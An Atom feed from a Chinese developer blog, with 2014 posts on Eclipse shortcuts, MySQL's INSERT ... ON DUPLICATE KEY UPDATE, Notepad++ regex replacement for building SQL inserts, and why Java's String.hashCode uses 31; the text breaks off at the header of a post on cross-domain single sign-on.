<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[高爽|Coder]]></title>
  <subtitle><![CDATA[在通向架构师的路上]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://www.ghsau.com/"/>
  <updated>2014-05-24T18:08:47.254Z</updated>
  <id>http://www.ghsau.com/</id>
  
  <author>
    <name><![CDATA[ghsau]]></name>
    <email><![CDATA[ghsau@163.com]]></email>
  </author>
  
  <generator uri="http://zespia.tw/hexo/">Hexo</generator>
  
  <entry>
    <title><![CDATA[一张有趣的漫画]]></title>
    <link href="http://www.ghsau.com/2014/05/24/%E4%B8%80%E5%BC%A0%E6%9C%89%E8%B6%A3%E7%9A%84%E6%BC%AB%E7%94%BB/"/>
    <id>http://www.ghsau.com/2014/05/24/一张有趣的漫画/</id>
    <published>2014-05-24T06:18:27.000Z</published>
    <updated>2014-05-24T06:20:29.000Z</updated>
    <content type="html"><![CDATA[<p><img src="http://img.blog.csdn.net/20140524133612781?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p>
]]></content>
    
    
      <category term="刨根问底" scheme="http://www.ghsau.com/tags/%E5%88%A8%E6%A0%B9%E9%97%AE%E5%BA%95/"/>
    
      <category term="非技术" scheme="http://www.ghsau.com/categories/%E9%9D%9E%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Eclipse使用]]></title>
    <link href="http://www.ghsau.com/2014/04/20/eclipse%E4%BD%BF%E7%94%A8/"/>
    <id>http://www.ghsau.com/2014/04/20/eclipse使用/</id>
    <published>2014-04-20T09:31:00.000Z</published>
    <updated>2014-05-11T12:56:33.000Z</updated>
    <content type="html"><![CDATA[<p>到了新公司，大家都在用idea，我也有想换的冲动，更换之前，记录下Eclipse常用的配置和快捷键，防止以后忘记。</p>
<h3 id="下载">下载</h3>
<p>最近发现了一款比较好用的Eclipse，那就是Spring Tool Suite(STS)，STS基于Eclipse做了诸多支持，如GIT、Maven，支持最好的当然是Spring了，下载地址戳<a href="http://spring.io/tools/sts/all" target="_blank">这里</a>。</p>
<h3 id="配置">配置</h3>
<p>编码：Windows—&gt;Preferences—&gt;General—&gt;Workspace—&gt;Text file encoding<br>字体：Windows—&gt;Preferences—&gt;General—&gt;Appearance—&gt;Colors and Fonts<br>智能提示：Windows—&gt;Preferences—&gt;Java—&gt;Editor—&gt;Content Assist—&gt;<br>Auto activation triggers for Java—&gt;.abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@<br><a id="more"></a></p>
<h3 id="快捷键">快捷键</h3>
<p>Ctrl+Shift+R 快速打开资源</p>
<p>Ctrl+Shift+T 快速打开类</p>
<p>Ctrl+Shift+E 选择一个已经打开的编辑窗口</p>
<p>Ctrl+Shift+W 关闭所有编辑窗口</p>
<p>Ctrl+Shift+F 代码格式化</p>
<p>Ctrl+Shift+/ 选中加注释</p>
<p>Ctrl+Shift+\ 选中去掉注释</p>
<p>Ctrl+Shift+C 选中行加/去掉注释</p>
<p>Ctrl+Alt+↓ 向下复制一行</p>
<p>Ctrl+Alt+↑ 向上复制一行</p>
<p>Ctrl+Q 返回到最后编辑处</p>
<p>Ctrl+O 打开大纲视图</p>
<p>Ctrl+M 最大/小化</p>
<p>Ctrl+E 搜索一个已经打开的编辑窗口</p>
<p>Ctrl+1 解决问题</p>
<p>Ctrl+2&nbsp;</p>
<p>Ctrl+N 新建</p>
<p>Ctrl+W 关闭当前窗口</p>
<p>Ctrl+F6 切换编辑窗口</p>
<p>Ctrl+D 删除行</p>
<p>Ctrl+Page Up 上一窗口</p>
<p>Ctrl+Page Down 下一窗口</p>
<p>Alt+/ 提示</p>
<p>Alt+↑ 移到上一行</p>
<p>Alt+↓ 移到下一行</p>
<p>Alt+← 上一光标位置</p>
<p>Alt+→ 下一光标位置&nbsp;</p>
<p>Alt+Shift+O 高亮变量</p>
<p>Alt+Shift+R 重命名</p>
<p>Alt+Shift+M 抽取方法</p>
<p>Alt+Shift+S&nbsp;</p>
<p>Alt+Shift+Z</p>
<p>Shift+Enter 切换到新行</p>
]]></content>
    <summary type="html"><![CDATA[<p>到了新公司，大家都在用idea，我也有想换的冲动，更换之前，记录下Eclipse常用的配置和快捷键，防止以后忘记。</p>
<h3 id="下载">下载</h3>
<p>最近发现了一款比较好用的Eclipse，那就是Spring Tool Suite(STS)，STS基于Eclipse做了诸多支持，如GIT、Maven，支持最好的当然是Spring了，下载地址戳<a href="http://spring.io/tools/sts/all" target="_blank">这里</a>。</p>
<h3 id="配置">配置</h3>
<p>编码：Windows—&gt;Preferences—&gt;General—&gt;Workspace—&gt;Text file encoding<br>字体：Windows—&gt;Preferences—&gt;General—&gt;Appearance—&gt;Colors and Fonts<br>智能提示：Windows—&gt;Preferences—&gt;Java—&gt;Editor—&gt;Content Assist—&gt;<br>Auto activation triggers for Java—&gt;.abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@<br>]]></summary>
    
      <category term="eclipse" scheme="http://www.ghsau.com/tags/eclipse/"/>
    
      <category term="开发环境" scheme="http://www.ghsau.com/categories/%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[INSERT ... ON DUPLICATE KEY UPDATE]]></title>
    <link href="http://www.ghsau.com/2014/04/13/insert--on-duplicate-key-update/"/>
    <id>http://www.ghsau.com/2014/04/13/insert--on-duplicate-key-update/</id>
    <published>2014-04-13T14:05:00.000Z</published>
    <updated>2014-05-11T08:30:12.000Z</updated>
    <content type="html"><![CDATA[<p>向数据库插入记录时，有时会有这种需求，当符合某种条件的数据存在时，去修改它，不存在时，则新增，也就是saveOrUpdate操作。这种控制可以放在业务层，也可以放在数据库层，大多数数据库都支持这种需求，如Oracle的merge语句，再如本文所讲的MySQL中的INSERT … ON DUPLICATE KEY UPDATE语句。</p>
<p>该语句是基于唯一索引或主键使用，比如一个字段a被加上了unique index，并且表中已经存在了一条记录值为1，下面两个语句会有相同的效果：</p>
<pre><code><span class="operator"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">table</span> (a,b,c) <span class="keyword">VALUES</span> (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) <span class="keyword">ON</span> DUPLICATE <span class="keyword">KEY</span> <span class="keyword">UPDATE</span> c=c+<span class="number">1</span>;</span>
<span class="operator"><span class="keyword">UPDATE</span> <span class="keyword">table</span> <span class="keyword">SET</span> c=c+<span class="number">1</span> <span class="keyword">WHERE</span> a=<span class="number">1</span>;</span>
</code></pre><p><a id="more"></a><br>ON DUPLICATE KEY UPDATE后面可以放多个字段，用英文逗号分割。使用ON DUPLICATE KEY UPDATE，最终如果插入了一个新行，则受影响的行数是1，如果修改了已存在的一行数据，则受影响的行数是2。</p>
<p>如果字段b也被加上了unique index，则该语句和下面的update语句是等效的：</p>
<pre><code><span class="operator"><span class="keyword">UPDATE</span> <span class="keyword">table</span> <span class="keyword">SET</span> c=c+<span class="number">1</span> <span class="keyword">WHERE</span> a=<span class="number">1</span> <span class="keyword">OR</span> b=<span class="number">2</span> LIMIT <span class="number">1</span>;</span>
</code></pre><p>如果a=1 OR b=2匹配了多行，则只有一行会被修改。通常的，在ON DUPLICATE KEY UPDATE语句中，我们应该避免多个唯一索引的情况。如果需要插入或更新多条数据，并且更新的字段需要根据其它字段来运算时，可以使用如下语句：</p>
<pre><code><span class="operator"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">table</span> (a,b,c) <span class="keyword">VALUES</span> (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>),(<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="keyword">ON</span> DUPLICATE <span class="keyword">KEY</span> <span class="keyword">UPDATE</span> c=<span class="keyword">VALUES</span>(a)+<span class="keyword">VALUES</span>(b);</span>
</code></pre><p>在ON DUPLICATE KEY UPDATE后面使用VALUES()方法，这个语句等同于下面的两个语句：</p>
<pre><code><span class="operator"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">table</span> (a,b,c) <span class="keyword">VALUES</span> (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) <span class="keyword">ON</span> DUPLICATE <span class="keyword">KEY</span> <span class="keyword">UPDATE</span> c=<span class="number">3</span>;</span><span class="comment">--1+2</span>
<span class="operator"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">table</span> (a,b,c) <span class="keyword">VALUES</span> (<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="keyword">ON</span> DUPLICATE <span class="keyword">KEY</span> <span class="keyword">UPDATE</span> c=<span class="number">9</span>;</span><span class="comment">--4+5</span>
</code></pre><p>如果一个表中包含了一个auto_increment的字段，每次insert数据后，可以通过last_insert_id()方法返回最后自动生成的值，如果通过INSERT … ON DUPLICATE KEY UPDATE语句修改了一条数据，那么再通过last_insert_id()方法获取的值将不正确，实际测试中是多了一个数，比如向表中增加了3条数据，那么通过last_insert_id()方法得到的值是3，但是通过该语句修改了一条数据后，通过last_insert_id()方法得到的值是4。如果想解决该问题，可以通过如下语句：</p>
<pre><code><span class="operator"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">table</span> (a,b,c) <span class="keyword">VALUES</span> (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) <span class="keyword">ON</span> DUPLICATE <span class="keyword">KEY</span> <span class="keyword">UPDATE</span> id=LAST_INSERT_ID(id), c=<span class="number">3</span>;</span>
</code></pre><p>重点是这句id=LAST_INSERT_ID(id)。</p>
<p>英文原文：<a href="https://dev.mysql.com/doc/refman/5.0/en/insert-on-duplicate.html" target="_blank">https://dev.mysql.com/doc/refman/5.0/en/insert-on-duplicate.html</a></p>
]]></content>
    <summary type="html"><![CDATA[<p>向数据库插入记录时，有时会有这种需求，当符合某种条件的数据存在时，去修改它，不存在时，则新增，也就是saveOrUpdate操作。这种控制可以放在业务层，也可以放在数据库层，大多数数据库都支持这种需求，如Oracle的merge语句，再如本文所讲的MySQL中的INSERT … ON DUPLICATE KEY UPDATE语句。</p>
<p>该语句是基于唯一索引或主键使用，比如一个字段a被加上了unique index，并且表中已经存在了一条记录值为1，下面两个语句会有相同的效果：</p>
<pre><code><span class="operator"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">table</span> (a,b,c) <span class="keyword">VALUES</span> (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) <span class="keyword">ON</span> DUPLICATE <span class="keyword">KEY</span> <span class="keyword">UPDATE</span> c=c+<span class="number">1</span>;</span>
<span class="operator"><span class="keyword">UPDATE</span> <span class="keyword">table</span> <span class="keyword">SET</span> c=c+<span class="number">1</span> <span class="keyword">WHERE</span> a=<span class="number">1</span>;</span>
</code></pre><p>]]></summary>
    
      <category term="MySQL" scheme="http://www.ghsau.com/tags/MySQL/"/>
    
      <category term="数据库" scheme="http://www.ghsau.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Notepad++列编辑、正则查找、替换]]></title>
    <link href="http://www.ghsau.com/2014/03/29/notepad++%E5%88%97%E7%BC%96%E8%BE%91%E3%80%81%E6%AD%A3%E5%88%99%E6%9F%A5%E6%89%BE%E3%80%81%E6%9B%BF%E6%8D%A2/"/>
    <id>http://www.ghsau.com/2014/03/29/notepad++列编辑、正则查找、替换/</id>
    <published>2014-03-29T11:07:00.000Z</published>
    <updated>2014-05-24T17:20:49.000Z</updated>
    <content type="html"><![CDATA[<p><strong>目标</strong>：</p>
<p>将源数据转成初始化sql语句。</p>
<p><strong>源数据</strong>：</p>
<pre><code><span class="number">104110040018</span>,<span class="number">1</span>,中国银行,中国银行天津琼州道支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市
<span class="number">104110040059</span>,<span class="number">1</span>,中国银行,中国银行天津利民道支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市
<span class="number">104110040091</span>,<span class="number">1</span>,中国银行,中国银行天津九龙路支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市
<span class="number">104110040106</span>,<span class="number">1</span>,中国银行,中国银行天津枫林路支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市
<span class="number">104110040139</span>,<span class="number">1</span>,中国银行,中国银行天津滨湖路支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市
<span class="number">104110040155</span>,<span class="number">1</span>,中国银行,中国银行天津南楼支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市
<span class="number">104110045006</span>,<span class="number">1</span>,中国银行,中国银行天津和平支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市
<span class="number">104110050021</span>,<span class="number">1</span>,中国银行,中国银行天津海洋支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市
<span class="number">104110050048</span>,<span class="number">1</span>,中国银行,中国银行泰达大街支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市
</code></pre><p><a id="more"></a><br><strong>处理列头</strong>：</p>
<p>将光标定位在第一行数据开始处，按alt+c组合键，弹出列编辑窗口，如图：<img src="http://img.blog.csdn.net/20140329183748562?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p>
<p>插入相应文本，确定后，数据变成了下面这样：</p>
<pre><code><span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110040018</span>,<span class="number">1</span>,中国银行,中国银行天津琼州道支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市
<span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110040059</span>,<span class="number">1</span>,中国银行,中国银行天津利民道支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市
<span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110040091</span>,<span class="number">1</span>,中国银行,中国银行天津九龙路支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市
<span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110040106</span>,<span class="number">1</span>,中国银行,中国银行天津枫林路支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市
<span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110040139</span>,<span class="number">1</span>,中国银行,中国银行天津滨湖路支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市
<span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110040155</span>,<span class="number">1</span>,中国银行,中国银行天津南楼支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市
<span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110045006</span>,<span class="number">1</span>,中国银行,中国银行天津和平支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市
<span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110050021</span>,<span class="number">1</span>,中国银行,中国银行天津海洋支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市
<span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110050048</span>,<span class="number">1</span>,中国银行,中国银行泰达大街支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市</span>
</code></pre><p><strong>处理列尾</strong>：</p>
<p>按ctrl+h组合键，弹出替换窗口，如图：</p>
<p><img src="http://img.blog.csdn.net/20140329184145937?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p>
<p>windows下，每行都以这两个字符结束，\r使光标移到行首，\n使光标下移一行，注意要将查找模式选择为扩展，全部替换后，数据变成了下面这样：</p>
<pre><code><span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110040018</span>,<span class="number">1</span>,中国银行,中国银行天津琼州道支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市);</span>
<span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110040059</span>,<span class="number">1</span>,中国银行,中国银行天津利民道支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市);</span>
<span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110040091</span>,<span class="number">1</span>,中国银行,中国银行天津九龙路支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市);</span>
<span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110040106</span>,<span class="number">1</span>,中国银行,中国银行天津枫林路支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市);</span>
<span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110040139</span>,<span class="number">1</span>,中国银行,中国银行天津滨湖路支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市);</span>
<span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110040155</span>,<span class="number">1</span>,中国银行,中国银行天津南楼支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市);</span>
<span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110045006</span>,<span class="number">1</span>,中国银行,中国银行天津和平支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市);</span>
<span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110050021</span>,<span class="number">1</span>,中国银行,中国银行天津海洋支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市);</span>
<span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110050048</span>,<span class="number">1</span>,中国银行,中国银行泰达大街支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市);</span>
</code></pre><p><strong>处理文本</strong>：</p>
<p>要将中文转换成两端带单引号的，匹配中文需要用正则<strong>[一-龥]+</strong>，这里的问题是我们替换的时候要获取当前匹配的字符串，按ctrl+h组合键，弹出替换窗口，如图：</p>
<p><img src="http://img.blog.csdn.net/20140329185501875?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p>
<p>使用小括号将匹配的字符串包上，然后替换值中可以通过$1表达式来获取到当前正在匹配的值，这里可以更复杂些，比如存在多个小括号，相应的可以使用$1、$2、$3来获取对应值，全部替换后，就是我们最终想要的数据了。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
</pre></td><td class="code"><pre><span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110040018</span>,<span class="number">1</span>,<span class="string">'中国银行'</span>,<span class="string">'中国银行天津琼州道支行'</span>,<span class="keyword">NULL</span>,<span class="number">1100</span>,<span class="string">'天津市'</span>,<span class="number">12</span>,<span class="string">'天津市'</span>);</span>
<span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110040059</span>,<span class="number">1</span>,<span class="string">'中国银行'</span>,<span class="string">'中国银行天津利民道支行'</span>,<span class="keyword">NULL</span>,<span class="number">1100</span>,<span class="string">'天津市'</span>,<span class="number">12</span>,<span class="string">'天津市'</span>);</span>
<span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110040091</span>,<span class="number">1</span>,<span class="string">'中国银行'</span>,<span class="string">'中国银行天津九龙路支行'</span>,<span class="keyword">NULL</span>,<span class="number">1100</span>,<span class="string">'天津市'</span>,<span class="number">12</span>,<span class="string">'天津市'</span>);</span>
<span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110040106</span>,<span class="number">1</span>,<span class="string">'中国银行'</span>,<span class="string">'中国银行天津枫林路支行'</span>,<span class="keyword">NULL</span>,<span class="number">1100</span>,<span class="string">'天津市'</span>,<span class="number">12</span>,<span class="string">'天津市'</span>);</span>
<span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110040139</span>,<span class="number">1</span>,<span class="string">'中国银行'</span>,<span class="string">'中国银行天津滨湖路支行'</span>,<span class="keyword">NULL</span>,<span class="number">1100</span>,<span class="string">'天津市'</span>,<span class="number">12</span>,<span class="string">'天津市'</span>);</span>
<span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110040155</span>,<span class="number">1</span>,<span class="string">'中国银行'</span>,<span class="string">'中国银行天津南楼支行'</span>,<span class="keyword">NULL</span>,<span class="number">1100</span>,<span class="string">'天津市'</span>,<span class="number">12</span>,<span class="string">'天津市'</span>);</span>
<span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110045006</span>,<span class="number">1</span>,<span class="string">'中国银行'</span>,<span class="string">'中国银行天津和平支行'</span>,<span class="keyword">NULL</span>,<span class="number">1100</span>,<span class="string">'天津市'</span>,<span class="number">12</span>,<span class="string">'天津市'</span>);</span>
<span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110050021</span>,<span class="number">1</span>,<span class="string">'中国银行'</span>,<span class="string">'中国银行天津海洋支行'</span>,<span class="keyword">NULL</span>,<span class="number">1100</span>,<span class="string">'天津市'</span>,<span class="number">12</span>,<span class="string">'天津市'</span>);</span>
<span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> t_bank <span class="keyword">values</span>(<span class="number">104110050048</span>,<span class="number">1</span>,<span class="string">'中国银行'</span>,<span class="string">'中国银行泰达大街支行'</span>,<span class="keyword">NULL</span>,<span class="number">1100</span>,<span class="string">'天津市'</span>,<span class="number">12</span>,<span class="string">'天津市'</span>);</span>
</pre></td></tr></table></figure>

]]></content>
    <summary type="html"><![CDATA[<p><strong>目标</strong>：</p>
<p>将源数据转成初始化sql语句。</p>
<p><strong>源数据</strong>：</p>
<pre><code><span class="number">104110040018</span>,<span class="number">1</span>,中国银行,中国银行天津琼州道支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市
<span class="number">104110040059</span>,<span class="number">1</span>,中国银行,中国银行天津利民道支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市
<span class="number">104110040091</span>,<span class="number">1</span>,中国银行,中国银行天津九龙路支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市
<span class="number">104110040106</span>,<span class="number">1</span>,中国银行,中国银行天津枫林路支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市
<span class="number">104110040139</span>,<span class="number">1</span>,中国银行,中国银行天津滨湖路支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市
<span class="number">104110040155</span>,<span class="number">1</span>,中国银行,中国银行天津南楼支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市
<span class="number">104110045006</span>,<span class="number">1</span>,中国银行,中国银行天津和平支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市
<span class="number">104110050021</span>,<span class="number">1</span>,中国银行,中国银行天津海洋支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市
<span class="number">104110050048</span>,<span class="number">1</span>,中国银行,中国银行泰达大街支行,<span class="keyword">NULL</span>,<span class="number">1100</span>,天津市,<span class="number">12</span>,天津市
</code></pre><p>]]></summary>
    
      <category term="notepad++" scheme="http://www.ghsau.com/tags/notepad++/"/>
    
      <category term="开发环境" scheme="http://www.ghsau.com/categories/%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Why 31?]]></title>
    <link href="http://www.ghsau.com/2014/03/16/why-31/"/>
    <id>http://www.ghsau.com/2014/03/16/why-31/</id>
    <published>2014-03-16T09:22:00.000Z</published>
    <updated>2014-05-11T16:03:44.000Z</updated>
    <content type="html"><![CDATA[<p>前几天被人问到了hashcode如何实现，说实话，真的是没有自己写过，通常情况下都会通过IDE自动生成，惭愧。今天研究了下hashcode的生成原理，首先看一下String类中的hashCode方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="code"><pre><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span>() {
	<span class="keyword">int</span> h = hash;
	<span class="keyword">if</span> (h == <span class="number">0</span> && value.length &gt; <span class="number">0</span>) {
		<span class="keyword">char</span> val[] = value;

		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; value.length; i++) {
			h = <span class="number">31</span> * h + val[i];
		}
		hash = h;
	}
	<span class="keyword">return</span> h;
}
</pre></td></tr></table></figure>

<a id="more"></a>

<p>核心的算法就是中间的for循环，假如字符串是”abcde”，那最终的hash值应该是31(31(31(31a+b) + c) + d) + e，扩号展开为a<em>31^4+b</em>31^3+c<em>31^2+d</em>31^1+e<em>31^0，设字符串的长度为n，那最终的计算公式为：s[0]</em>31^(n-1) + s[1]*31^(n-2) + … + s[n-1]，这实际上就是31进制数转成10进制数的算法。那为什么要用31作为基数呢？</p>
<p>我想可能有几点原因：31首先是一个素数，与素数相乘运算后，能降低hashcode碰撞的概率；31其次是一个特殊的值(32-1)，32的二进制是100000，31的二进制是011111，31*N = N &lt;&lt; 5 - N，运算速度会快。</p>
<p>普通类覆盖hashCode方法也可以使用类似的算法，如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="code"><pre><span class="annotation">@Override</span>
<span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span>() {
	<span class="keyword">final</span> <span class="keyword">int</span> prime = <span class="number">31</span>;
	<span class="keyword">int</span> result = <span class="number">1</span>;
	result = prime * result
			+ ((firstname == <span class="keyword">null</span>) ? <span class="number">0</span> : firstname.hashCode());
	result = prime * result
			+ ((lastname == <span class="keyword">null</span>) ? <span class="number">0</span> : lastname.hashCode());
	result = prime * result
			+ ((nickname == <span class="keyword">null</span>) ? <span class="number">0</span> : nickname.hashCode());
	<span class="keyword">return</span> result;
}
</pre></td></tr></table></figure>

<p>属性如果是引用类型，要与其hashCode运算，属性如果是byte、short、int类型，要与其值运算，属性如果是float、double、long，要经过特殊运算，可以参考对应封装类的hashCode方法实现。</p>
]]></content>
    <summary type="html"><![CDATA[<p>前几天被人问到了hashcode如何实现，说实话，真的是没有自己写过，通常情况下都会通过IDE自动生成，惭愧。今天研究了下hashcode的生成原理，首先看一下String类中的hashCode方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="code"><pre><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span>() {
	<span class="keyword">int</span> h = hash;
	<span class="keyword">if</span> (h == <span class="number">0</span> && value.length &gt; <span class="number">0</span>) {
		<span class="keyword">char</span> val[] = value;

		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; value.length; i++) {
			h = <span class="number">31</span> * h + val[i];
		}
		hash = h;
	}
	<span class="keyword">return</span> h;
}
</pre></td></tr></table></figure>

]]></summary>
    
      <category term="hashcode" scheme="http://www.ghsau.com/tags/hashcode/"/>
    
      <category term="31" scheme="http://www.ghsau.com/tags/31/"/>
    
      <category term="Java SE" scheme="http://www.ghsau.com/categories/Java%20SE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[完全跨域的单点登录]]></title>
    <link href="http://www.ghsau.com/2014/03/05/%E5%AE%8C%E5%85%A8%E8%B7%A8%E5%9F%9F%E7%9A%84%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95/"/>
    <id>http://www.ghsau.com/2014/03/05/完全跨域的单点登录/</id>
